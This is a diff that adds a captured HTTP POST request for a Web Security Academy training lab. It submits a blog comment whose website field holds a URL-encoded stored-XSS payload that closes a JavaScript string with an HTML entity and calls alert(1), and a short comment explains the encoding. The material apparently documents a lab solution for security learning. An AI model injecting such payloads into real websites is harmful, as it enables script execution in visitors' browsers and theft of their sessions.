@@ -1,0 +1,16 @@
+POST /post/comment HTTP/1.1
+Host: ac171f221e285d1e805e81d700de007c.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac171f221e285d1e805e81d700de007c.web-security-academy.net/post?postId=4
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 175
+Connection: close
+Cookie: session=4dH4viDBGaMZEpPjPfJhVTu8p9BKMHdO
+Upgrade-Insecure-Requests: 1
+
+csrf=vVSWDGpqwVsodYxYZDOT1viHII6zsq8U&postId=4&comment=Hello+World&name=Kiddie&email=kiddie%40test.com&website=http%3A%2F%2Fwww.kiddie.com%26apos%3b)%3balert(1)%3b//%26apos%3b
+
+// Needs to URL encode the HTML entity as & has meaning in URL.
